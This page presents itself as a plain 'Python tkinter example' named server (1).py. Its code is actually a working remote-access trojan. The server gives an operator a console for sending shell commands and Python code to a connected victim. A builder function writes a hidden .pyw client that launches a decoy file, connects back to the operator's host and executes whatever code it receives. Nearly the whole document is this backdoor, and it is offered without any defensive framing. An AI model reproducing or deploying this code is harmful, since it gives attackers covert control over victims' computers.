---
title: server (1)
date: 2020-05-07
---
Example Python program server (1).py
Python version 3.x or newer.
To check the Python version use:

    python --version

## Modules

* from tqdm import tqdm
* import os, sys, time, random, socket, colorama, datetime
* 	f = f'''from tkinter import *
* from tkinter import ttk, messagebox
* import time, datetime, socket, os, sys
* 			f.write('from tkinter import messagebox\\nmessagebox.showinfo(' + "'" + str(l['message_name']) + "'" + ', ' + "'" + str(l['message_text']) + "'" + ')')
* 			f.write('from tkinter import messagebox\\nmessagebox.showerror(' + "'" + str(l['message_name']) + "'" + ', ' + "'" + str(l['message_text']) + "'" + ')')
* 			f.write('from tkinter import messagebox\\nmessagebox.showwarning(' + "'" + str(l['message_name']) + "'" + ', ' + "'" + str(l['message_text']) + "'" + ')')

## Methods

* def start():
* def reseter():
* def server():
* def console():
* def commands(text):
* def builder(name = 'unamed', file = None, host = socket.gethostbyname(socket.getfqdn()), port = 8080):

## Code

Python tkinter example

    from tqdm import tqdm
    import os, sys, time, random, socket, colorama, datetime
    
    colorama.init()
    Res = sys.argv[0]
    
    def start():
    
    	os.system('@echo off')
    	os.system('title Server')
    	os.system('cls')
    	time.sleep(1)
    	s = r''' ____
    / ___|  ___ _ ____   _____ _ __
    \___ \ / _ \ '__\ \ / / _ \ '__|
     ___) |  __/ |   \ V /  __/ |
    |____/ \___|_|    \_/ \___|_|'''
    
    	print(colorama.Fore.YELLOW + s + colorama.Fore.RESET)
    	print(' ')
    	time.sleep(1)
    	print('VERSION: ' + sys.version)
    	print('\n\n')
    	time.sleep(2)
    	console()
    
    def reseter():
    	os.system('start ' + str(Res))
    	time.sleep(0.5)
    	exit()
    
    def server():
    
    	os.system('@echo off')
    	os.system('title Server')
    	os.system('cls')
    	print(colorama.Fore.GREEN + ' [ Server Started ] ' + colorama.Fore.RESET)
    	print(' ')
    	time.sleep(1)
    	s = r''' ____
    / ___|  ___ _ ____   _____ _ __
    \___ \ / _ \ '__\ \ / / _ \ '__|
     ___) |  __/ |   \ V /  __/ |
    |____/ \___|_|    \_/ \___|_|'''
    
    	print(colorama.Fore.YELLOW + s + colorama.Fore.RESET)
    	print(' ')
    	time.sleep(1)
    	print('VERSION: ' + sys.version)
    	print('ip: ' + colorama.Fore.BLUE + socket.gethostbyname(socket.getfqdn()) + colorama.Fore.RESET)
    	print('port: ' + colorama.Fore.MAGENTA + '8080' + colorama.Fore.RESET)
    	print('\n')
    	time.sleep(2)
    	sock = socket.socket(socket.AF_INET)
    	sock.bind((socket.gethostbyname(socket.getfqdn()), 8080))
    	sock.listen(10)
    	conn, addr = sock.accept()
    	print(f'{colorama.Fore.GREEN}connected:{colorama.Fore.RESET} ({colorama.Fore.BLUE}{addr[0]}{colorama.Fore.RESET})-({colorama.Fore.MAGENTA}{addr[1]}{colorama.Fore.RESET})/ [{colorama.Fore.CYAN}{datetime.datetime.now()}{colorama.Fore.RESET}]: ')
    	print(' ')
    	while True:
    
    		istime = time.strftime('%H:%M', time.localtime())
    		print(colorama.Fore.GREEN + f'{os.getlogin()}@{socket.getfqdn()}' + colorama.Fore.RESET + '-[' + colorama.Fore.CYAN + f'{istime}' + colorama.Fore.RESET + '] ' + colorama.Fore.YELLOW + '>>> ' + colorama.Fore.RESET, end = '')
    		text = input()
    		if text.replace(' ', '') == 'message':
    
    			set1 = input('set: ')
    			message_name = input('message_name: ')
    			message_text = input('message_text: ')
    			set1 = set1.replace("'", '\'').encode('utf-8')
    			message_name = message_name.replace("'", '\'').encode('utf-8')
    			message_text = message_text.replace("'", '\'').encode('utf-8')
    			conn.send(b'l = {\'name\':\'message\',\'set\':\'' + set1 + b'\', \'message_name\':\'' + message_name + b'\', \'message_text\':\'' + message_text + b'\'}')
    
    		elif text.replace(' ', '') == 'console':
    
    			cmd = input('command: ')
    			cmd = cmd.replace("'", '\'').encode('utf-8')
    			conn.send(b'l = {\'name\':\'console\', \'text\': \'' + cmd + b'\'}')
    			data = conn.recv(9999)
    			udata = data.decode('utf-8')
    			if udata == 'complite':
    				pass
    			else:
    				print(' ')
    				print(colorama.Fore.RED + udata + colorama.Fore.RESET)
    				print(' ')
    
    		elif text.replace(' ', '') == 'python':
    
    			py = input('command: ')
    			py = py.replace("'", '\'').encode('utf-8')
    			conn.send(b'l = {\'name\':\'python\', \'text\': \'' + py + b'\'}')
    			data = conn.recv(9999)
    			udata = data.decode('utf-8')
    			if udata == 'complite':
    				pass
    			else:
    				print(' ')
    				print(colorama.Fore.RED + udata + colorama.Fore.RESET)
    				print(' ')
    
    		elif text.replace(' ', '') == 'exit' or text.replace(' ', '') == 'exit()':
    
    			conn.send(b'l = {\'name\':\'exit\'}')
    			reseter()
    
    		else:
    
    			try:
    
    				exec(text)
    				
    			except Exception as e:
    
    				print('\n' + colorama.Fore.RED + str(e) + colorama.Fore.RESET + '\n')
    
    def console():
    
    	istime = time.strftime('%H:%M', time.localtime())
    	print(colorama.Fore.GREEN + f'{os.getlogin()}@{socket.getfqdn()}' + colorama.Fore.RESET + '-[' + colorama.Fore.CYAN + f'{istime}' + colorama.Fore.RESET + '] >>> ', end = '')
    	text = input()
    	commands(text)
    
    def commands(text):
    
    	try:
    		if text.replace(' ', '') == 'clear':
    			os.system('cls')
    		elif text.replace(' ', '') == 'reset':
    			start()
    		elif text.replace(' ', '') == 'exit':
    			exit()
    		else:
    			exec(text)
    	except Exception as e:
    		print(f'\n{colorama.Fore.RED}' + str(e) + '\n')
    	console()
    
    def builder(name = 'unamed', file = None, host = socket.gethostbyname(socket.getfqdn()), port = 8080):
    
    	time.sleep(1)
    	print(' ')
    	print(f'create: {name}.pyw ')
    	time.sleep(1)
    	print(' ')
    	try:
    		file2 = open('bilder/' + name + '.pyw', 'w')
    	except:
    		os.mkdir('bilder')
    		time.sleep(0.5)
    		file2 = open('bilder/' + name + '.pyw', 'w')
    
    	f = f'''from tkinter import *
    from tkinter import ttk, messagebox
    import time, datetime, socket, os, sys
    os.system('start {file}')
    conn = socket.socket(socket.AF_INET)
    conn.connect(('{host}', {port}))
    while True:
    	data = conn.recv(99999)
    	udata = data.decode('utf-8')
    	exec(udata)
    	if l['name'] == 'message':
    		if l['set'] == 'i':
    			f = open('message.pyw', 'w')
    			f.close()
    			f = open('message.pyw', 'r+')
    			f.write('from tkinter import messagebox\\nmessagebox.showinfo(' + "'" + str(l['message_name']) + "'" + ', ' + "'" + str(l['message_text']) + "'" + ')')
    			f.close()
    			time.sleep(1)
    			os.system('start message.pyw')
    		elif l['set'] == 'e':
    			f = open('message.pyw', 'w')
    			f.close()
    			f = open('message.pyw', 'r+')
    			f.write('from tkinter import messagebox\\nmessagebox.showerror(' + "'" + str(l['message_name']) + "'" + ', ' + "'" + str(l['message_text']) + "'" + ')')
    			f.close()
    			time.sleep(1)
    			os.system('start message.pyw')
    		elif l['set'] == 'w':
    			f = open('message.pyw', 'w')
    			f.close()
    			f = open('message.pyw', 'r+')
    			f.write('from tkinter import messagebox\\nmessagebox.showwarning(' + "'" + str(l['message_name']) + "'" + ', ' + "'" + str(l['message_text']) + "'" + ')')
    			f.close()
    			time.sleep(1)
    			os.system('start message.pyw')
    	elif l['name'] == 'console':
    		try:
    			os.system(l['text'])
    			conn.send(b'complite')
    		except Exception as e:
    			conn.send(str(e).encode('utf-8'))
    	elif l['name'] == 'python':
    		try:
    			exec(l['text'])
    			conn.send(b'complite')
    		except Exception as e:
    			conn.send(str(e).encode('utf-8'))
    	elif l['name'] == 'exit':
    		exit()'''
    	file2.close()
    	file2 = open('bilder/' + name + '.pyw', 'r+')
    	file2.write(f)
    	file2.close()
    	for i in tqdm(range(int(9e6))):
    		pass
    	print(' ')
    	time.sleep(0.125)
    	print(colorama.Fore.GREEN + 'Complite!' + colorama.Fore.RESET)
    	print(' ')
    
    
    if __name__ == '__main__':
    
    	try:
    
    		if sys.argv[1] == '-s' or sys.argv[1] == '--start':
    
    			start()
    
    	except:
    
    		start()

## Useful Links

- Articles: https://python-commandments.org/
- Python shell: https://bsdnerds.org/learn-python/
